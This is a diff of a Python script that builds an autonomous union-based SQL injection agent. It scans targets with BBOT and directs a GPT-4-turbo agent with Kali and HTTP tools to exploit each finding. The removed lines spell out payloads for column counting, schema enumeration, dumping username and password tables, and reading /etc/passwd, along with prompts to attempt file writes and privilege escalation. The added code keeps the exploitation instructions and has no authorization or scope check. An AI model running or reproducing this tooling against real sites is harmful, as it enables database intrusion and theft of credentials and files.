@@ -13,237 +13,90 @@ from dreadnode.agent.result import AgentResult
 from dreadnode.agent.tools.bbot.tool import BBotTool
 from dreadnode.agent.tools.kali.tool import KaliTool
 from dreadnode.agent.tools.neo4j.tool import Neo4jTool
-from dreadnode.agent.tools.oast.tool import OastTool
 
 dn.configure(server=None, token=None, project="union-based-sqli-agent", console=False)
 
 console = Console()
 
-# Union-based SQLi focused payloads
-UNION_COLUMN_DETECTION = [
-    # Column counting techniques
-    "' ORDER BY 1--",
-    "' ORDER BY 2--", 
-    "' ORDER BY 3--",
-    "' ORDER BY 4--",
-    "' ORDER BY 5--",
-    "' ORDER BY 10--",
-    "' ORDER BY 20--",
-    "' ORDER BY 50--",
-    
-    # Alternative column counting
-    "' GROUP BY 1--",
-    "' GROUP BY 2--",
-    "' GROUP BY 3--",
-    "' GROUP BY 4--",
-    "' GROUP BY 5--",
-    
-    # Union null injection
-    "' UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-]
-
-UNION_DATA_EXTRACTION = [
-    # Basic union with version/database info
-    "' UNION SELECT @@version,NULL,NULL--",
-    "' UNION SELECT version(),NULL,NULL--",
-    "' UNION SELECT database(),NULL,NULL--",
-    "' UNION SELECT user(),NULL,NULL--",
-    "' UNION SELECT current_user(),NULL,NULL--",
-    
-    # Information schema queries
-    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
-    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--",
-    "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
-    "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--",
-    
-    # Common table data extraction
-    "' UNION SELECT username,password,NULL FROM users--",
-    "' UNION SELECT login,pass,NULL FROM admin--",
-    "' UNION SELECT email,password,NULL FROM accounts--",
-    "' UNION SELECT name,value,NULL FROM config--",
-    
-    # File reading (MySQL)
-    "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
-    "' UNION SELECT LOAD_FILE('C:\\windows\\system32\\drivers\\etc\\hosts'),NULL,NULL--",
-    
-    # Advanced data extraction
-    "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
-    "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
-]
-
-UNION_ERROR_PATTERNS = [
-    # Column count mismatch errors
-    "the used select statements have a different number of columns",
-    "column count doesn't match",
-    "operand should contain 1 column",
-    "each union query must have the same number of columns",
-    "number of columns in select list must match",
-    "column count mismatch",
-    "different number of expressions",
-]
-
-@dn.task(name="Union-Based SQLi Analysis", label="analyze_union_sqli")
-async def analyze_union_based_sqli(finding_data: dict) -> dict:
-    """Analyze a finding specifically for union-based SQL injection."""
-    agent = create_union_based_sqli_agent()
+@dn.task(name="Analyze Union-Based SQLi Finding", label="analyze_union_sqli_finding")
+async def analyze_sqli_finding(finding_data: dict[str, t.Any]) -> dict[str, t.Any]:
+    """Analyze a BBOT SQL injection finding for union-based exploitability."""
+    sqli_agent = create_sqli_agent()
     
     url = finding_data.get('data', {}).get('url', '')
     host = finding_data.get('data', {}).get('host', '')
     description = finding_data.get('data', {}).get('description', '')
     
     param_name = extract_param_name(description)
+    param_type = extract_param_type(description)
     original_value = extract_original_value(description)
     
-    console.print(f"[*] Testing UNION-BASED SQL injection on {host}")
-    console.print(f"    URL: {url}")
-    console.print(f"    Parameter: {param_name}")
+    result = await sqli_agent.run(
+        f"Analyze the potential SQL injection vulnerability at {url} using parameter '{param_name}'. "
+        f"The original parameter value was: {original_value}\n\n"
+        f"Focus on UNION-BASED SQL injection techniques. Test for direct data extraction via UNION SELECT. "
+        f"Start with column structure discovery and adapt based on responses you receive."
+    )
+
+    tool_outputs = {}
+    tools_used = []
     
-    # Build focused prompt with union-specific context
-    prompt = f"""Target: {url}
-Parameter: {param_name}
-Original Value: {original_value}
+    for message in result.messages:
+        if message.role == "assistant" and message.tool_calls:
+            for tool_call in message.tool_calls:
+                tool_name = tool_call.function.name
+                tools_used.append(tool_name)
+        elif message.role == "tool":
+            tool_name = getattr(message, "name", "unknown")
+            tool_outputs[tool_name] = message.content
 
-MISSION: Test this parameter specifically for UNION-BASED SQL injection vulnerabilities.
+    finding_stored = "store_sqli_finding" in tools_used
+    has_sqli = finding_stored
+    if result.messages and result.messages[-1].content:
+        has_sqli = has_sqli or any(
+            phrase in result.messages[-1].content.lower()
+            for phrase in [
+                "union injection confirmed",
+                "union select successful",
+                "column count determined",
+                "data extracted via union",
+                "database version extracted",
+                "table names retrieved",
+                "union-based injection",
+                "information_schema accessed",
+            ]
+        )
 
-UNION SQLI METHODOLOGY:
-1. COLUMN COUNT ENUMERATION:
-   - Use ORDER BY technique to determine column count
-   - Start with ORDER BY 1, increment until error
-   - Alternative: Use GROUP BY for column counting
-   - Document exact error message when count exceeded
-
-2. UNION NULL INJECTION:
-   - Once column count known, test UNION SELECT with NULLs
-   - Match exact number of columns from enumeration
-   - Confirm union query executes without errors
-   - Test data type compatibility
-
-3. DATA EXTRACTION:
-   - Replace NULLs with actual data queries
-   - Extract database version, name, current user
-   - Query information_schema for tables/columns
-   - Attempt to extract sensitive data from tables
-
-4. ADVANCED TECHNIQUES:
-   - Use GROUP_CONCAT for multiple row results
-   - Test file reading with LOAD_FILE() (MySQL)
-   - Try INTO OUTFILE for file writing (if writable)
-   - Test for privilege escalation opportunities
-
-Focus ONLY on union-based techniques. Look for successful data extraction via UNION SELECT.
-
-Test payloads systematically, starting with column enumeration then progressing to data extraction."""
-
-    result = await agent.run(prompt)
+    dn.log_metric("tools_used", len(tools_used))
+    dn.log_metric("has_union_sqli", 1 if has_sqli else 0)
+    dn.log_metric("stored_in_db", 1 if finding_stored else 0)
     
-    # Process results with union-specific logic
-    column_count = extract_column_count(result)
-    has_union_sqli = analyze_union_responses(result)
-    extracted_data = extract_union_data(result)
-    
-    dn.log_metric("union_sqli_found", 1 if has_union_sqli else 0)
-    dn.log_metric("column_count_determined", 1 if column_count > 0 else 0)
-    dn.log_metric("data_extracted", 1 if extracted_data else 0)
-    
-    return {
+    analysis_result = {
         "url": url,
         "host": host,
         "parameter": param_name,
-        "vulnerability_type": "union_based_sqli",
-        "has_sqli": has_union_sqli,
-        "column_count": column_count,
-        "extracted_data": extracted_data,
+        "param_type": param_type,
+        "tools_used": tools_used,
+        "tool_outputs": tool_outputs,
         "analysis": result.messages[-1].content if result.messages else None,
-        "detection_method": "union_select_data_extraction"
+        "steps": result.steps,
+        "has_sqli": has_sqli,
+        "stored_in_db": finding_stored,
+        "original_finding": finding_data
     }
 
-def extract_column_count(result: AgentResult) -> int:
-    """Extract determined column count from agent analysis."""
-    if not result.messages:
-        return 0
-    
-    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
-    
-    # Look for column count mentions
-    import re
-    column_patterns = [
-        r'column count is (\d+)',
-        r'(\d+) columns detected',
-        r'order by (\d+) successful',
-        r'union with (\d+) columns',
-        r'table has (\d+) columns'
-    ]
-    
-    for pattern in column_patterns:
-        match = re.search(pattern, content)
-        if match:
-            return int(match.group(1))
-    
-    return 0
+    return analysis_result
 
-def analyze_union_responses(result: AgentResult) -> bool:
-    """Analyze agent responses for union-based SQLi indicators."""
-    if not result.messages:
-        return False
-    
-    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
-    
-    # Check for union-based SQLi success indicators
-    union_indicators = [
-        'union select successful',
-        'union injection confirmed',
-        'column count determined',
-        'data extracted via union',
-        'union query executed',
-        'information_schema accessed',
-        'database version extracted',
-        'table names retrieved',
-        'column names retrieved',
-        'union-based injection',
-        'successful union query',
-        'data enumeration successful',
-        'union select results',
-        'schema information extracted'
-    ]
-    
-    return any(indicator in content for indicator in union_indicators)
+def create_sqli_agent() -> Agent:
+    """Create a union-based SQL injection analysis agent."""
+    tools = [BBotTool(), KaliTool(), Neo4jTool()]
 
-def extract_union_data(result: AgentResult) -> list:
-    """Extract any data that was successfully retrieved via union injection."""
-    if not result.messages:
-        return []
-    
-    content = ' '.join([msg.content for msg in result.messages if msg.content])
-    extracted = []
-    
-    # Look for common data extraction patterns
-    if 'database version' in content.lower():
-        extracted.append('database_version')
-    if 'database name' in content.lower():
-        extracted.append('database_name')
-    if 'table names' in content.lower():
-        extracted.append('table_names')
-    if 'column names' in content.lower():
-        extracted.append('column_names')
-    if 'user data' in content.lower() or 'username' in content.lower():
-        extracted.append('user_data')
-    if 'file contents' in content.lower():
-        extracted.append('file_contents')
-    
-    return extracted
-
-def create_union_based_sqli_agent() -> Agent:
-    """Create a union-based SQL injection specialist agent."""
-    tools = [KaliTool(), BBotTool(), Neo4jTool()]
-    
-    union_sqli_context = """
-UNION-BASED SQL INJECTION SPECIALIST
-
-You are an expert focused EXCLUSIVELY on union-based SQL injection techniques.
+    return Agent(
+        name="union-based-sqli-agent",
+        description="An agent that analyzes and exploits union-based SQL injection vulnerabilities",
+        model="gpt-4-turbo",
+        tools=tools,
+        instructions="""You are an expert at analyzing and exploiting union-based SQL injection vulnerabilities.
 
 Your mission is to exploit SQL injection through UNION SELECT statements to directly extract data.
 
@@ -256,23 +109,25 @@ Follow this adaptive approach:
 
 The key insight: union-based injection gives you direct data access. Start simple and build complexity based on what works.
 
-Each application will behave differently. Some block certain keywords, others have data type restrictions, others limit result lengths. Adapt your approach based on the responses you receive.
+Each application will behave differently. Some block certain keywords, others have data type restrictions, others limit result lengths.
 
 Use the http_request tool to test union payloads systematically. Let the application responses guide your technique selection.
-"""
 
-    return Agent(
-        name="union-based-sqli-agent",
-        description="Specialized agent for union-based SQL injection detection and exploitation",
-        model="gpt-4-turbo",
-        tools=tools,
-        instructions=union_sqli_context,
+If you confirm union-based SQL injection exists, use store_sqli_finding to record the vulnerability.""",
     )
 
 def extract_param_name(description: str) -> str:
     """Extract parameter name from BBOT finding description."""
     if "Name: [" in description:
         start = description.find("Name: [") + 7
+        end = description.find("]", start)
+        return description[start:end] if end > start else "unknown"
+    return "unknown"
+
+def extract_param_type(description: str) -> str:
+    """Extract parameter type from BBOT finding description."""
+    if "Parameter Type: [" in description:
+        start = description.find("Parameter Type: [") + 17
         end = description.find("]", start)
         return description[start:end] if end > start else "unknown"
     return "unknown"
@@ -285,52 +140,152 @@ def extract_original_value(description: str) -> str:
         return description[start:end] if end > start else ""
     return ""
 
-async def main():
-    parser = argparse.ArgumentParser(description="Union-based SQL injection specialist")
-    parser.add_argument("finding_file", type=Path, help="JSON file containing SQLi findings")
-    parser.add_argument("--debug", action="store_true", help="Debug mode")
+def is_sqli_finding(event: dict[str, t.Any]) -> bool:
+    """Check if a BBOT event is a SQL injection finding."""
+    if event.get('type') != 'FINDING':
+        return False
     
-    args = parser.parse_args()
+    description = event.get('data', {}).get('description', '')
+    return 'SQL Injection' in description
+
+async def hunt_from_bbot_scan(
+    targets: Path | None = None,
+    presets: list[str] | None = None,
+    modules: list[str] | None = None,
+    flags: list[str] | None = None,
+    config: Path | dict[str, t.Any] | None = None,
+) -> None:
+    """Hunt for union-based SQL injection vulnerabilities from BBOT scan findings."""
     
+    if isinstance(targets, Path):
+        with targets.open() as f:
+            targets = [line.strip() for line in f.readlines() if line.strip()]
+
+    if not targets:
+        console.print("Error: No targets provided.")
+        return
+
     with dn.run("union-based-sqli-hunt"):
-        console.print("Starting UNION-BASED SQL injection analysis...")
+        dn.log_params(
+            target_count=len(targets),
+            presets=presets or [],
+            modules=modules or [],
+            flags=flags or [],
+        )
+
+        console.print(f"Starting union-based SQL injection hunt on {len(targets)} targets...")
+
+        sqli_findings_count = 0
+        total_findings = 0
         
+        tool = BBotTool()
+        scan_modules = modules or ["httpx", "excavate", "hunt"]
+        
+        for target in targets:
+            try:
+                scan_config = config or {"omit_event_types": []}
+                
+                events = tool.run(
+                    target=target,
+                    presets=presets,
+                    modules=scan_modules,
+                    flags=flags,
+                    config=scan_config,
+                )
+                
+                async for event in events:
+                    if is_sqli_finding(event):
+                        total_findings += 1
+                        
+                        try:
+                            analysis_result = await analyze_sqli_finding(event)
+                            
+                            if analysis_result["has_sqli"]:
+                                sqli_findings_count += 1
+                                
+                                security_finding = {
+                                    "url": analysis_result["url"],
+                                    "host": analysis_result["host"], 
+                                    "parameter": analysis_result["parameter"],
+                                    "finding_type": "union_based_sqli",
+                                    "risk_level": "high",
+                                    "analysis": analysis_result["analysis"],
+                                    "tool_outputs": analysis_result["tool_outputs"],
+                                    "timestamp": time.time(),
+                                    "stored_in_db": analysis_result["stored_in_db"],
+                                }
+                                
+                                dn.log_output(f"union_sqli_finding_{analysis_result['host']}", security_finding)
+                                console.print(f"Union-based SQL injection confirmed on {analysis_result['host']}")
+                            else:
+                                console.print(f"Union-based SQL injection not exploitable on {event.get('host')}")
+                                
+                        except Exception as e:
+                            console.print(f"Error analyzing SQL injection finding: {e}")
+
+            except Exception as e:
+                console.print(f"Error scanning {target}: {e}")
+
+        dn.log_metric("total_findings", total_findings)
+        dn.log_metric("union_confirmed", sqli_findings_count)
+        
+        console.print(f"Hunt Summary:")
+        console.print(f"   SQL injection candidates found: {total_findings}")
+        console.print(f"   Union-based SQL injection vulnerabilities confirmed: {sqli_findings_count}")
+
+async def analyze_finding_file(finding_file: Path, debug: bool = False) -> None:
+    """Analyze SQL injection findings from a JSON file."""
+    
+    with dn.run("union-based-sqli-analyze"):        
         try:
-            with open(args.finding_file) as f:
+            with finding_file.open() as f:
                 findings = json.load(f)
             
             if not isinstance(findings, list):
                 findings = [findings]
             
-            confirmed_count = 0
-            data_extracted_count = 0
-            
+            sqli_count = 0
             for finding in findings:
-                analysis_result = await analyze_union_based_sqli(finding)
-                
-                if analysis_result["has_sqli"]:
-                    confirmed_count += 1
-                    column_count = analysis_result["column_count"]
-                    extracted_data = analysis_result["extracted_data"]
+                if is_sqli_finding(finding):
+                    analysis_result = await analyze_sqli_finding(finding)
                     
-                    console.print(f"[+] UNION-BASED SQLi CONFIRMED: {analysis_result['host']}")
-                    console.print(f"    Column count: {column_count}")
-                    console.print(f"    Data extracted: {', '.join(extracted_data) if extracted_data else 'None'}")
+                    if debug:
+                        console.print(f"Tools used: {', '.join(analysis_result['tools_used'])}")
                     
-                    if extracted_data:
-                        data_extracted_count += 1
-                else:
-                    console.print(f"[-] No union-based SQLi: {finding.get('data', {}).get('host')}")
+                    if analysis_result["has_sqli"]:
+                        sqli_count += 1
+                        console.print(f"Union-based SQL injection confirmed")
+                    else:
+                        console.print(f"No union-based SQL injection exploitation possible")
             
-            dn.log_metric("total_union_sqli_confirmed", confirmed_count)
-            dn.log_metric("successful_data_extraction", data_extracted_count)
-            
-            console.print(f"\nUnion-based SQLi Summary:")
-            console.print(f"  Total confirmed: {confirmed_count}")
-            console.print(f"  Successful data extraction: {data_extracted_count}")
+            dn.log_metric("union_findings", sqli_count)
             
         except Exception as e:
-            console.print(f"Error: {e}")
+            console.print(f"Error analyzing findings file: {e}")
+
+async def main() -> None:
+    parser = argparse.ArgumentParser(description="Union-based SQL injection vulnerability hunter")
+    subparsers = parser.add_subparsers(dest="command", help="Available commands")
+
+    hunt_parser = subparsers.add_parser("hunt", help="Hunt for union-based SQL injection vulnerabilities using BBOT")
+    hunt_parser.add_argument("--targets", type=Path, help="Path to file containing targets")
+    hunt_parser.add_argument("--presets", nargs="*", help="BBOT presets to use")
+    hunt_parser.add_argument("--modules", nargs="*", help="BBOT modules to use")
+    hunt_parser.add_argument("--flags", nargs="*", help="BBOT flags to use")
+    hunt_parser.add_argument("--config", type=Path, help="Path to config file")
+
+    analyze_parser = subparsers.add_parser("analyze", help="Analyze SQL injection findings from JSON file")
+    analyze_parser.add_argument("finding_file", type=Path, help="JSON file containing BBOT findings")
+    analyze_parser.add_argument("--debug", action="store_true", help="Show debug information")
+
+    args = parser.parse_args()
+
+    if args.command == "hunt":
+        await hunt_from_bbot_scan(args.targets, args.presets, args.modules, args.flags, args.config)
+    elif args.command == "analyze":
+        await analyze_finding_file(args.finding_file, args.debug)
+    else:
+        parser.print_help()
 
 if __name__ == "__main__":
     asyncio.run(main())
